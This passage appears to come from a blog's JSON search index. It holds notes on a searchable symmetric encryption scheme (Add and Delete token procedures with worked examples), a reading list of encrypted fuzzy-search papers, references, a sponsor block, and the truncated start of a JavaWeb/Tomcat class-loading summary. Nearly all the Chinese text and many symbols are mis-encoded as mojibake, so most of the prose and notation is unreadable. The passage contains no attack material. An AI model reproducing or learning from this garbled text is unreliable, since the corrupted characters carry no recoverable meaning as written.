c<sub>f</sub>)\n\n#### T<sub>d</sub>â†DeleteToken(f,K)\n\n- è¾“å‡º Delete Token T<sub>dÂ </sub> = (g<sub>x</sub>(f), f<sub>y</sub>(f))\n\n#### (I',C')â†Add(I,C,T<sub>a</sub>,c)\n\n- 1.è§£æ T<sub>a</sub> ä¸º (Î±<sub>1</sub>, Î±<sub>2</sub>,  . . . ,  Î±<sub>f</sub>,  Î²,  Î»<sub>1</sub>,  . . .,  Î»<sub>f</sub>)\n- 2.è§£æ Î² ä¸º (Î²<sub>1</sub>, Î²<sub>2</sub>, *k'*)\n- 3.åœ¨æ›´æ–°è¡¨ä¸­ T<sub>u</sub> æ·»åŠ ä¸€ä¸ªæ–°çš„æ¡ç›® (Î²<sub>1</sub>, <Ï†<sub>z</sub>(addr) || *k'*> âŠ• Î²<sub>2</sub>)\n- 4.å¯¹äº i âˆˆ [1,2,..., f]ï¼Œè§£æ Î±<sub>i</sub> ä¸º (Î±<sub>1</sub>, Î±<sub>2</sub>, Î³, Î², Ï€',*k'*)ï¼Œåœ¨æœç´¢è¡¨ T<sub>s</sub> æœç´¢ Î±<sub>i</sub> ï¼Œè®¾ <â„‡ || *k*> = T<sub>s</sub>[Î±<sub>1</sub>] âŠ• Î±<sub>2</sub>ï¼Œè®¡ç®—  N<sub>k</sub>(Î±<sub>1</sub> || Î³ || Ï€' || Ï†<sub>z</sub>(addr+1) || *k'*) ï¼Œå¹¶å°†æ­¤èŠ‚ç‚¹æ·»åŠ åˆ°åˆ—è¡¨   L<sub>w<sub>i</sub></sub> çš„æœ«å°¾\n- 5.åœ¨æ›´æ–°åˆ—è¡¨ A<sub>u</sub> ä¸­æ·»åŠ ä¸€ä¸ªæ–°åˆ—è¡¨ L<sub>f</sub>\n- 6.å¯¹äº i âˆˆ [1,2,..., f]ï¼Œè§£æ Î»<sub>i</sub> ä¸º (Î»<sub>1</sub>, Î»<sub>2</sub>, Î»<sub>3</sub>, *k'*)ï¼Œåœ¨ L<sub>f</sub> å­˜å‚¨ N<sub>k</sub>(Î»<sub>1</sub>|| Î»<sub>2</sub> || Î»<sub>3Â </sub>|| Ï†<sub>z</sub>(addr+1) || *k'*) \n- 7.å°†å¯†æ–‡ c æ·»åŠ åˆ°æ–‡ä»¶é›†åˆ C\n\næ·»åŠ ä¸€ä¸ªæ–‡ä»¶ã€‚å‡è®¾æ•°æ®æ‰€æœ‰è€…æƒ³æ·»åŠ ä¸€ä¸ªåŒ…å«å…³é”®å­— w<sub>1 </sub>å’Œ w<sub>2 </sub>çš„æ–°æ–‡ä»¶ f<sub>5 </sub>\n\né¦–å…ˆï¼Œä»–åº”è¯¥ç”Ÿæˆä¸€ä¸ªæ·»åŠ ä»¤ç‰Œ T<sub>a</sub> = (info<sub>a</sub>, c<sub>5</sub>)ï¼Œå…¶ä¸­ c<sub>5Â </sub>è¡¨ç¤º f<sub>5Â </sub>å¯¹åº”çš„åŠ å¯†æ–‡ä»¶ï¼Œinfo<sub>a</sub> è¡¨ç¤ºæœåŠ¡å™¨å¿…é¡»æ·»åŠ åˆ°ç´¢å¼•çš„èŠ‚ç‚¹ä¿¡æ¯ã€‚å½“æœåŠ¡å™¨æ¥æ”¶åˆ°â€œæ·»åŠ ä»¤ç‰Œâ€æ—¶ï¼Œç´¢å¼•å¿…é¡»æŒ‰ç…§å¦‚ä¸‹æ–¹å¼æ›´æ–°ã€‚\n\n- é¦–å…ˆï¼Œåœ¨æ›´æ–°åˆ—è¡¨ A<sub>uÂ </sub>ä¸­æ·»åŠ ä¸€ä¸ªåŒ…å«æ–‡ä»¶ f<sub>5 </sub>çš„æ–°åˆ—è¡¨ L<sub>f5</sub> ï¼Œåœ¨ L<sub>f5</sub> ä¸­çš„èŠ‚ç‚¹å°†å­˜å‚¨ f<sub>5</sub> ä¸­å‡ºç°çš„æ‰€æœ‰å…³é”®å­—\n\n- åœ¨æ›´æ–°è¡¨ T<sub>u </sub>ä¸­ï¼Œæ·»åŠ ä¸€ä¸ªæ–°çš„æ¡ç›® T<sub>u </sub>[g<sub>x</sub>(f<sub>5</sub>)]\n- æœåŠ¡å™¨é€šè¿‡å°†æ¡ç›® g<sub>x</sub>(f<sub>5</sub>) è®¾ç½®ä¸ºåˆ—è¡¨ L<sub>f5</sub> çš„å¤´éƒ¨æ¥æ›´æ–°æ›´æ–°è¡¨\n\nç”±äºå…³é”®å­— w<sub>1 </sub>å’Œ w<sub>2 </sub>å‡ºç°åœ¨æ–‡ä»¶ f<sub>5 </sub> ä¸­ï¼ŒæœåŠ¡å™¨è¿˜åº”è¯¥æ›´æ–°æœç´¢åˆ—è¡¨ L<sub>w1</sub> å’Œ L<sub>w<sub>2</sub></sub> ï¼ŒæœåŠ¡å™¨æ ¹æ®æœç´¢è¡¨ T<sub>s</sub> è·å–åˆ—è¡¨  L<sub>w<sub>1</sub></sub> å’Œ L<sub>w<sub>2</sub></sub> çš„å¤´éƒ¨ï¼Œå¹¶åœ¨åˆ—è¡¨ä¸­æ·»åŠ æ–°çš„èŠ‚ç‚¹ã€‚\n\n#### (I',C')â†Delete(I,C,T<sub>d</sub>)\n\n- 1.è§£æ T<sub>d</sub> ä¸º (Î±, Î²)\n- 2.åœ¨æ›´æ–°è¡¨ä¸­ T<sub>u</sub> ä¸­æœç´¢ Î±\n- 3.è®¾<*â„‡* || *k*> = T<sub>u</sub>[Î±] âŠ• Î²\n- 4.ä½¿ç”¨å¯†é’¥  *k* è§£å¯†èŠ‚ç‚¹ A<sub>u</sub>[â„‡] ï¼Œç„¶åé€ä¸ªè§£å¯†åˆ—è¡¨ä¸­çš„èŠ‚ç‚¹ï¼ŒæœåŠ¡å™¨å°†ä»è¿™äº›èŠ‚ç‚¹è·å–æ–‡ä»¶ f ä¸­åŒ…å«çš„æ‰€æœ‰å…³é”®å­—ï¼Œè¿™é‡Œï¼Œæˆ‘ä»¬å‡è®¾æ–‡ä»¶ f åŒ…å«å…³é”®å­— (w<sub>1</sub>ï¼Œw<sub>2</sub>ï¼Œ. . . ï¼Œ w<sub>f</sub>)ï¼ŒæœåŠ¡å™¨å°†å®šä½ L' =  (L<sub>1</sub>ï¼ŒL<sub>2</sub>ï¼Œ. . . ï¼Œ L<sub>|phrase|</sub>)çš„å³è¾¹å¼€å§‹ï¼ŒæœåŠ¡å™¨å°†ä»æ›´æ–°è¡¨ T<sub>u</sub> ä¸­åˆ é™¤æ¡ç›® T<sub>u</sub>[Î±]\n- 5>å¯¹äºåˆ—è¡¨ L<sub>wi </sub>âˆˆ L'\n  - a>é€ä¸ªè§£å¯†åˆ—è¡¨ä¸­çš„èŠ‚ç‚¹\n  - b>å¦‚æœ id(f<sub>j</sub>) çš„å€¼ç­‰äº id(f)ï¼Œè¯·åˆ é™¤æ­¤èŠ‚ç‚¹\n- 6.åˆ é™¤æ–‡ä»¶é›†åˆ C ä¸­çš„å¯†æ–‡ c\n\nåˆ é™¤ä¸€ä¸ªæ–‡ä»¶ã€‚å‡è®¾æ•°æ®æ‰€æœ‰è€…å¸Œæœ›åˆ é™¤åŒ…å«å…³é”®å­— w<sub>1 </sub>å’Œ w<sub>3 </sub>çš„ç°æœ‰æ–‡ä»¶ f<sub>1</sub>\n\né¦–å…ˆï¼Œä»–åº”è¯¥ç”Ÿæˆä¸€ä¸ªåˆ é™¤ä»¤ç‰Œ T<sub>d</sub> = (g<sub>x</sub>(f<sub>1</sub>), f<sub>y</sub>(f<sub>1</sub>))ï¼Œå¹¶å°†å…¶æäº¤ç»™æœåŠ¡å™¨ã€‚\n\n- å½“æœåŠ¡å™¨æ”¶åˆ°åˆ é™¤ä»¤ç‰Œæ—¶ï¼Œå¯ä»¥åœ¨æ›´æ–°è¡¨ T<sub>u</sub> ä¸­æ‰¾åˆ°æ–‡ä»¶ f<sub>1</sub> å¯¹åº”çš„æ¡ç›®ï¼ŒæœåŠ¡å™¨è®¡ç®—  T<sub>u</sub> = [g<sub>x</sub>(f<sub>1</sub>)âŠ•f<sub>y</sub>(f<sub>1</sub>)]ï¼Œå¾—åˆ°åˆ—è¡¨ L<sub>f1</sub> çš„å¤´éƒ¨ã€‚\n\n- ä¹‹åï¼ŒæœåŠ¡å™¨è·å–æ–‡ä»¶ f<sub>1</sub> ä¸­åŒ…å«çš„å…³é”®å­—ï¼Œä¾‹å¦‚ (g<sub>x</sub>(w<sub>1</sub>), f<sub>y</sub>(w<sub>1</sub>)) å’Œ (g<sub>x</sub>(w<sub>3</sub>), f<sub>y</sub>(w<sub>3</sub>))\n\nå½“åˆ é™¤ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼ŒæœåŠ¡å™¨åº”è¯¥åŒæ—¶æ›´æ–°æœç´¢åˆ—è¡¨å’Œæ›´æ–°åˆ—è¡¨ã€‚æ ¹æ®åˆ—è¡¨ L<sub>f1</sub> çš„ä¿¡æ¯ï¼ŒæœåŠ¡å™¨å¯ä»¥åœ¨æœç´¢è¡¨ä¸­æ‰¾åˆ°åˆ—è¡¨ L<sub>w1</sub> å’Œ L<sub>w3</sub> çš„å¼€å§‹ä½ç½®ï¼Œå¹¶åˆ é™¤èŠ‚ç‚¹ (w<sub>1</sub>, f<sub>1</sub>) å’Œ (w<sub>3</sub>, f<sub>1</sub>) ã€‚ç„¶åï¼ŒæœåŠ¡å™¨å°†ä»æ–‡ä»¶é›†åˆ C ä¸­åˆ é™¤åŠ å¯†æ–‡ä»¶ c<sub>1</sub>\n\n\n##  ğŸ“Œå¾…çœ‹\n\n[åŠ å¯†äº‘æ•°æ®ä¸‹åŸºäºSimhahçš„æ¨¡ç³Šæ’åºæœç´¢](http://cjc.ict.ac.cn/online/onlinepaper/yy-2017210100801.pdf?msclkid=4929d702cedb11ec8a28f935b8f6c6f0)\n\n[ çŸ©é˜µåœ¨ä¿¡æ¯åŠ å¯†ä¸­çš„åº”ç”¨(å¯†ç å­¦)_Juanrrçš„åšå®¢-CSDNåšå®¢_çŸ©é˜µåŠ å¯†](https://blog.csdn.net/weixin_43809290/article/details/84636189?msclkid=5154879fcedc11ecb52657f242c84a13)\n\n[CN107220343 åŸºäºå±€éƒ¨æ•æ„Ÿå“ˆå¸Œçš„ä¸­æ–‡å¤šå…³é”®è¯æ¨¡ç³Šæ’åºå¯†æ–‡æœç´¢æ–¹æ³• (wipo.int)](https://patentscope2.wipo.int/search/zh/detail.jsf?docId=CN205434118&_cid=JP1-L2XESV-63489-3)\n\n[å¯¹äº‘ä¸­åŠ å¯†æ•°æ®è¿›è¡Œéšç§ä¿æŠ¤çš„å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢](https://ieeexplore.ieee.org/abstract/document/6848153)ã€CCF Aã€‘\n\næœ¬æ–‡åˆ©ç”¨**å±€éƒ¨æ•æ„Ÿå“ˆå¸Œ**æŠ€æœ¯ï¼Œæå‡ºäº†**ä¸€ç§æ–°å‹çš„å¤šå…³é”®è¯æ¨¡ç³Šæœç´¢æ–¹æ¡ˆ**ã€‚æˆ‘ä»¬æå‡ºçš„æ–¹æ¡ˆé€šè¿‡ç®—æ³•è®¾è®¡è€Œä¸æ˜¯æ‰©å±•ç´¢å¼•æ–‡ä»¶æ¥å®ç°æ¨¡ç³ŠåŒ¹é…ã€‚å®ƒè¿˜æ¶ˆé™¤äº†å¯¹é¢„å®šä¹‰å­—å…¸çš„éœ€æ±‚ï¼Œå¹¶æœ‰æ•ˆåœ°æ”¯æŒå¤šä¸ªå…³é”®å­—æ¨¡ç³Šæœç´¢ï¼Œè€Œä¸ä¼šå¢åŠ ç´¢å¼•æˆ–æœç´¢å¤æ‚æ€§ã€‚å¯¹çœŸå®æ•°æ®çš„å¹¿æ³›åˆ†æå’Œå®éªŒè¡¨æ˜ï¼Œæˆ‘ä»¬æå‡ºçš„æ–¹æ¡ˆæ˜¯å®‰å…¨ã€é«˜æ•ˆå’Œå‡†ç¡®çš„ã€‚æ®æˆ‘ä»¬æ‰€çŸ¥ï¼Œè¿™æ˜¯ç¬¬ä¸€ä¸ªåœ¨åŠ å¯†çš„äº‘æ•°æ®ä¸Šå®ç°å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢çš„å·¥ä½œã€‚\n\n\n\n[ä½¿ç”¨å¤–éƒ¨å­˜å‚¨å™¨|å›ç­”å¤§å‹æ•°æ®é›†ä¸Šçš„è¿‘ä¼¼å­—ç¬¦ä¸²æŸ¥è¯¢](https://ieeexplore.ieee.org/document/5767856)ã€CCF Aã€‘\n\næœ¬æ–‡å¼€å‘äº†**ä¸€ç§åŸºäºæˆæœ¬çš„è‡ªé€‚åº”ç®—æ³•**ï¼Œè¯¥ç®—æ³•å¯ä»¥å¹³è¡¡æ£€ç´¢å€™é€‰åŒ¹é…é¡¹å’Œè®¿é—®å€’æ’åˆ—è¡¨çš„ I/O æˆæœ¬ã€‚å¯¹å¤§å‹çœŸå®æ•°æ®é›†çš„å®éªŒè¯å®ï¼Œç®€å•åœ°å°†ç°æœ‰ç®—æ³•é€‚åº”åŸºäºç£ç›˜çš„è®¾ç½®å¹¶ä¸èƒ½å¾ˆå¥½åœ°å·¥ä½œï¼Œå¹¶ä¸”æˆ‘ä»¬çš„æ–°æŠ€æœ¯å¯ä»¥æœ‰æ•ˆåœ°å›ç­”æŸ¥è¯¢ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬çš„è§£å†³æ–¹æ¡ˆæ˜æ˜¾ä¼˜äºæœ€è¿‘çš„åŸºäºæ ‘çš„æŒ‡æ•° B<sup>ed</sup>-treeã€‚\n\n[å¯¹äº‘ä¸­çš„åŠ å¯†æ•°æ®ä½¿ç”¨ N-Gram å’ŒåŠ å¯†æ–¹æ³•è¿›è¡Œæ¨¡ç³Šå…³é”®å­—åŒ¹é…|SpringerLink](https://link.springer.com/chapter/10.1007/978-981-15-0947-6_52)\n\n\n\nå¸ƒè°·é¸Ÿæœç´¢æ”¹è¿›ï¼šhttps://link.springer.com/article/10.1007/s00500-016-2062-9ã€CCF Cã€‘\n\n[åŸºäºæ–‡æ¡£å‘é‡çš„å¤šå…³é”®è¯å¯†æ–‡æ£€ç´¢ - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/412240360)\n\n### No.13 PPPSEDæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠPrivacy-Preserving Phrase Search over Encrypted Dataã€‹**\n\n- ä½œè€…ï¼š ä¾¯ä½³ä¼Ÿ, åˆ˜é›…èŒ¹, è£æµ©\n- å•ä½ï¼šé’å²›å¤§å­¦\n- ä¼šè®®ï¼š[ICBDT '21: 2021 4th International Conference on Big Data Technologies](https://dl.acm.org/doi/10.1145/3490322.3490347)\n\n- æ—¶é—´ï¼š2021å¹´12æœˆ\n\nåœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬æå‡ºäº†**ä¸€ä¸ªæ”¯æŒåŠ¨æ€æ›´æ–°çš„çŸ­è¯­æœç´¢SSEæ–¹æ¡ˆ**ã€‚æˆ‘ä»¬çš„æ–¹æ¡ˆåªéœ€è¦ç”¨æˆ·å’Œäº‘æœåŠ¡å™¨ä¹‹é—´çš„å•è½®äº¤äº’ï¼Œä½ç½®ä¿¡æ¯æ— æ³•æ³„éœ²ã€‚æˆ‘ä»¬çš„æ–¹æ¡ˆåˆ©ç”¨**è™šæ‹ŸäºŒå‰æ ‘**ï¼ˆVBTreeï¼‰ï¼Œå®ƒåªæ˜¯ä¸€ä¸ªç”¨äºå­˜å‚¨å…³é”®å­—çš„é€»è¾‘ç»“æ„ã€‚åœ¨å®é™…å­˜å‚¨ä¸­ï¼Œæ¯ä¸ªå¶èŠ‚ç‚¹çš„å…ƒç´ éƒ½å­˜å‚¨åœ¨å“ˆå¸Œè¡¨ä¸­ï¼Œéå¶èŠ‚ç‚¹æ˜ å°„åˆ°**å¸ƒéš†è¿‡æ»¤å™¨**ã€‚ä¸ºäº†ç¡®å®šæœç´¢å…³é”®å­—çš„ä½ç½®å…³ç³»ï¼Œæˆ‘ä»¬çš„æ–¹æ¡ˆåˆ©ç”¨**åŒæ€åŠ å¯†**å’Œ**åŒçº¿æ€§æ˜ å°„**ã€‚è¿™æ ·ï¼Œä½ç½®ä¿¡æ¯å°±æ— æ³•æ³„éœ²ã€‚\n\n### No.14 CBFEDæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠA Searchable Ciphertext Retrieval Method Based  on Counting Bloom Filter over Cloud Encrypted  Dataã€‹**\n\n- ä½œè€…ï¼š kuang YueJuan, Li Yong, Li Ping\n- å•ä½ï¼š\n- ä¼šè®®ï¼š[IJCS_47_2_15.pdf (iaeng.org)](http://www.iaeng.org/IJCS/issues_v47/issue_2/IJCS_47_2_15.pdf)\n\n- æ—¶é—´ï¼š2021å¹´12æœˆ\n\næœ¬æ–‡é¦–å…ˆæ„å»ºäº†æ–‡çŒ®ç´¢å¼•åŸºäº**è®¡æ•°å¸ƒéš†è¿‡æ»¤å™¨**æ£€ç´¢ï¼Œå¹¶æ˜ å°„å…³é”®å­—å“ˆå¸Œåœ¨æ–‡ä»¶é›†åˆçš„è®¡æ•°å¸ƒéš†è¿‡æ»¤å™¨ç´¢å¼•å‘é‡ï¼Œæ‰€ä»¥å®ç°äº†åŸºäºå…³é”®å­—çš„å¯†æ–‡æ£€ç´¢ã€‚åŒæ—¶ï¼Œæ”¯æŒæ£€ç´¢çš„**åŠ¨æ€æ›´æ–°**æ–‡ä»¶ç´¢å¼•ã€‚å…¶æ¬¡ï¼Œå¯¹æ£€ç´¢ç»“æœè¿›è¡Œæ’åºæ ¹æ®å…³è”åº¦ä¸èƒ½è¾¾åˆ°çš„åŸå› è®¡æ•°å¸ƒéš†è¿‡æ»¤å™¨æœ¬èº«æ²¡æœ‰è¯­ä¹‰å‡½æ•°ã€‚ä½¿ç”¨äº†**é¢‘ç‡çŸ©é˜µ**ï¼Œé‡‡ç”¨ **TF-IDF æ¨¡å‹**è®¡ç®—å…³é”®è¯çš„å…³è”å¾—åˆ†ä»¥ä¾¿æ ¹æ®ç›¸å…³æ€§å¾—åˆ†å¯¹æœç´¢ç»“æœè¿›è¡Œæ’åºã€‚\n\n\n\n[Achieve Efficient and Verifiable Conjunctive and Fuzzy Queries over Encrypted Data in Cloud | IEEE Journals & Magazine | IEEE Xplore](https://ieeexplore.ieee.org/document/8744411)\n\n## ğŸ“‹Reference\n\n- [å¯æœç´¢åŠ å¯†SWPæ–¹æ¡ˆå®ç° - ç®€ä¹¦](https://www.jianshu.com/p/d620bcf235e5?utm_campaign=haruki&utm_content=note&utm_medium=reader_share&utm_source=qq)\n- [å¯æœç´¢åŠ å¯†åŸºç¡€çŸ¥è¯†çš„å½’çº³ä¸æ€»ç»“](https://blog.csdn.net/A33280000f/article/details/116270371?spm=1001.2014.3001.5502)\n- [ç²¾é€‰12ç¯‡åŒºå—é“¾ä¸å¯æœç´¢åŠ å¯†ç›¸ç»“åˆè®ºæ–‡è¿›è¡Œæ±‡æ€»ä¸æ¦‚æ‹¬](https://blog.csdn.net/A33280000f/article/details/119273021?spm=1001.2014.3001.5501)\n- [ä¸“åˆ©ï¼šä¸€ç§å¯†æ–‡æ£€ç´¢æ–¹æ³•](https://patents.google.com/patent/CN103927340B/zh)\n- [ä¸“åˆ©ï¼šä¸€ç§äº‘å­˜å‚¨å¯†æ–‡æ£€ç´¢æ–¹æ³•åŠå…¶ç³»ç»Ÿ](https://patents.google.com/patent/CN103944711A/zh)  \n- [å†¯ç™»å›½ï¼šå¯†æ–‡æ£€ç´¢â€”â€”æ‰“å¼€äº‘å­˜å‚¨åŠ å¯†æ¡æ¢çš„é‡‘é’¥åŒ™](https://www.docin.com/p-824752557.html)\n- [è®ºæ–‡ | å¯æœç´¢åŠ å¯† Â· å¼€å±±ä¹‹ä½œ - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/135382555)\n- [åŠ å¯†æŠ€æœ¯çš„æœªæ¥ï¼šä»æœåŠ¡ç«¯å¯†ç å­˜å‚¨åˆ°ç”¨æˆ·æ•°æ®åŠ å¯†æ–¹æ¡ˆ](https://markdowner.net/article/158265681589440512)\n- [å¯æœç´¢åŠ å¯†_ç¬”è®°](http://www.atomsec.org/paper/practical-techniques-for-searches-on-encrypted-data/)\n- [å¯æœç´¢åŠ å¯†1_ç¬”è®°](https://blog.csdn.net/yalundong/article/details/72792973)\n- [å¯æœç´¢åŠ å¯†ä¹‹å€’æ’ç´¢å¼•](https://blog.csdn.net/weixin_39032619/article/details/110000216?spm=1001.2014.3001.5502)\n- [æœ€ç‰›ä¸€ç¯‡å¸ƒéš†è¿‡æ»¤å™¨è¯¦è§£](https://mp.weixin.qq.com/s/1AbsMXNvTcZ_baKES8K4Kg)\n- [ç®€å•çš„å¤ç° å¤šå…³é”®å­—æ¨¡ç³Šå¯æœç´¢åŠ å¯†](https://blog.csdn.net/weixin_39032619/article/details/110436737)\n- [Pythonå­¦ä¹ -numpyé«˜çº§æ•°ç»„å’ŒçŸ©é˜µçš„å†…ç§¯å‡½æ•°innerå’Œmatmul](https://blog.csdn.net/qq_19979101/article/details/92728610)\n- [TF-IDFï¼ˆè¯é¢‘-é€†æ–‡æ¡£é¢‘ç‡ï¼‰ä»‹ç» - ç®€ä¹¦ ](https://www.jianshu.com/p/b2c4ee414fac)\n- [Searchable Symmetric Encryption (SSE)ä»‹ç»](https://blog.csdn.net/c630843901/article/details/121541916?spm=1001.2014.3001.5502)\n- [ä¸€ç§åŸºäºBloomFilterçš„æ”¹è¿›å‹åŠ å¯†æ–‡æœ¬æ¨¡ç³Šæœç´¢æœºåˆ¶ç ”ç©¶](http://staff.ustc.edu.cn/~zhangwm/Paper/2019_15.pdf)\n- [å¯†ç å­¦ä¸­çš„MAC](https://blog.csdn.net/mutourend/article/details/100576422)\n- [Homomorphic MAC (unb.ca)](http://www.cs.unb.ca/~rlu1/slide/20140523chenli.pdf)\n- [bloom filteræµ…æï¼ˆåŸºæœ¬æ¦‚å¿µï¼Œæ¦‚ç‡åˆ†æï¼Œæºç åˆ†æï¼‰](https://blog.csdn.net/bnbjin/article/details/110437288)\n- [NLPâ€“æ–‡æœ¬å‘é‡åŒ–](https://deeplearning-doc.readthedocs.io/en/latest/deeplearning/NLP/NLP-text-vector.html)\n- [Secure nearest neighbor revisited](http://ieeexplore-ieee-org-s.vpn.uestc.edu.cn:8118/document/6544870)\n- [åˆ†ç±»ç®—æ³•ä¹‹Kæœ€è¿‘é‚»ç®—æ³•(KNN)çš„pythonå®ç°](https://www.jianshu.com/p/84f94f956382)\n- [å¯†ç å­¦çš„å®‰å…¨æ€§æµ…æ-3 - SecPulse.COM | å®‰å…¨è„‰æ](https://www.secpulse.com/archives/175281.html#:~:text=MACæ˜¯æŒ‡æ¶ˆæ¯è®¤è¯ç ï¼ˆå¸¦å¯†é’¥çš„Hashå‡½æ•°ï¼‰ï¼Œæ˜¯å¯†ç å­¦ä¸­é€šä¿¡å®ä½“åŒæ–¹ä½¿ç”¨çš„ä¸€ç§éªŒè¯æœºåˆ¶ï¼Œä¿è¯æ¶ˆæ¯æ•°æ®å®Œæ•´æ€§çš„ä¸€ç§å·¥å…·ã€‚,æ„é€ æ–¹æ³•ç”±M.Bellareæå‡ºï¼Œå®‰å…¨æ€§ä¾èµ–äºHashå‡½æ•°ï¼Œæ•…ä¹Ÿç§°å¸¦å¯†é’¥çš„Hashå‡½æ•°ã€‚ æ¶ˆæ¯è®¤è¯ç æ˜¯åŸºäºå¯†é’¥å’Œæ¶ˆæ¯æ‘˜è¦æ‰€è·å¾—çš„ä¸€ä¸ªå€¼ï¼Œå¯ç”¨äºæ•°æ®æºå‘é€æ–¹è®¤è¯å’Œå®Œæ•´æ€§æ ¡éªŒã€‚)\n- [å¯†ç å­¦çš„å®‰å…¨æ€§æµ…æ-2 (qq.com)](https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&mid=2652886199&idx=1&sn=eccfe7c2e1b33a75e822fdda9a03dc45&chksm=bd59a87a8a2e216cc2fa92caa2d6259c668979e451c2e2db85a2f53b4a896ebf9ad06ac8d492&scene=21#wechat_redirect)\n- [ç¼–è¾‘è·ç¦»è¯¦è§£ - çŸ¥ä¹ (zhihu.com)](https://zhuanlan.zhihu.com/p/91667128)\n- [æ–‡æœ¬ç¦»æ•£è¡¨ç¤ºï¼ˆä¸‰ï¼‰ï¼šTF-IDFç»“åˆn-gramè¿›è¡Œå…³é”®è¯æå–å’Œæ–‡æœ¬ç›¸ä¼¼åº¦åˆ†æ - Luv_GEM - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/Luv-GEM/p/10555843.html)\n\n\n\n\n\n## â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœä½ è§‰å¾—æœ¬æ–‡å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥è¯·æˆ‘å–ä¸€æ¯å†°å¯ä¹ï¼å˜»å˜»ğŸ¤­\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å¯æœç´¢åŠ å¯†"],"categories":["Crypto"]},{"title":"JavaWeb-æ±‡æ€»","url":"/posts/4688.html","content":"\n## å‰è¨€\n\næœ¬ç¯‡æ˜¯æˆ‘è‡ªå·±æ€»ç»“çš„ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠJava-Webã€‹çš„æ±‡æ€»ï¼Œç”±äºè¿™éƒ¨åˆ†çŸ¥è¯†æˆ‘ä¹‹å‰å­¦è¿‡ä¸€éƒ¨åˆ†æ‰€ä»¥åªä¼šæ›´æ–°éœ€è¦å¤ä¹ çš„çŸ¥è¯†å’Œæ²¡å­¦è¿‡çš„çŸ¥è¯†ï¼Œè¿™ä¸ªç« èŠ‚ä¼šä½œä¸ºé•¿æœŸæ›´æ–°çš„ä¸€ä¸ªç« èŠ‚ï¼Œéƒ¨åˆ†çŸ¥è¯†ç‚¹ç”¨åˆ°äº†å†å­¦ï¼Œå­¦äº†å†æ›´ã€‚\n\n## ç¬”è®°æ±‡æ€»\n\n- å‰ç«¯ä¸‰å‰‘å®¢ï¼š[Webå‰ç«¯ä¸‰å‰‘å®¢ | ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/38162.html)\n\n- Mavenï¼š[Maven | ç®€ç®€(jwt1399.top)](https://jwt1399.top/posts/38008.html)\n- Tomcatï¼š[Tomcat-æ±‡æ€» | ç®€ç®€](https://jwt1399.top/posts/4688.html#toc-heading-3)\n- Servletï¼š[Servlet | ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/55715.html)\n- Cookie & Sessionï¼š[Cookie & Session | ç®€ç®€](https://jwt1399.top/posts/37985.html)\n- Filter & Listenerï¼š[Filter & Listener-æ±‡æ€» | ç®€ç®€](https://jwt1399.top/posts/4688.html#toc-heading-6)\n- JSPï¼š[JSPå­¦ä¹ ç¬”è®° | ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/59789.html)\n- Thymeleafï¼š[Thymeleaf | ç®€ç®€](https://jwt1399.top/posts/4688.html#toc-heading-12)\n\n- Ajax & Axios [Ajax & Axios & Json | ç®€ç®€](https://jwt1399/posts/16553.html)\n\n- Vue & Elementï¼š[Vue & Element | ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/28587.html)\n\n## Tomcat\n\n###  Tomcatå®‰è£…\n\n[Tomcatå®‰è£… |  ç®€ç®€ (jwt1399.top)](https://jwt1399.top/posts/55715.html#toc-heading-2)\n\n### Tomcatç±»åŠ è½½\n\nTomcat æœåŠ¡å™¨å¦‚æœè¦åŒæ—¶è¿è¡Œå¤šä¸ª Web åº”ç”¨ç¨‹åºï¼Œé‚£ä¹ˆå°±å¿…é¡»è¦å®ç°ä¸åŒåº”ç”¨ç¨‹åºä¹‹é—´çš„éš”ç¦»ã€‚\n\n- Tomcat éœ€è¦åˆ†åˆ«å»åŠ è½½ä¸åŒåº”ç”¨ç¨‹åºçš„ç±»ä»¥åŠä¾èµ–ï¼Œè¿˜å¿…é¡»ä¿è¯åº”ç”¨ç¨‹åºä¹‹é—´çš„ç±»æ— æ³•ç›¸äº’è®¿é—®ï¼Œè€Œä¼ ç»Ÿçš„ç±»åŠ è½½æœºåˆ¶æ— æ³•åšåˆ°è¿™ä¸€ç‚¹\n- è€Œä¸”æ¯ä¸ªåº”ç”¨ç¨‹åºéƒ½æœ‰è‡ªå·±çš„ä¾èµ–ï¼Œå¦‚æœä¸¤ä¸ªåº”ç”¨ç¨‹åºä½¿ç”¨äº†åŒä¸€ä¸ªç‰ˆæœ¬çš„åŒä¸€ä¸ªä¾èµ–ï¼Œé‚£ä¹ˆè¿˜æœ‰å¿…è¦å»é‡æ–°åŠ è½½å—ï¼Ÿ\n\nä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼ŒTomcat æœåŠ¡å™¨ç¼–å†™äº†ä¸€å¥—è‡ªå·±çš„ç±»åŠ è½½æœºåˆ¶ã€‚\n\n![](https://img.jwt1399.top/img/202205202322938.png)\n\né¦–å…ˆæˆ‘ä»¬è¦çŸ¥é“ï¼ŒTomcat 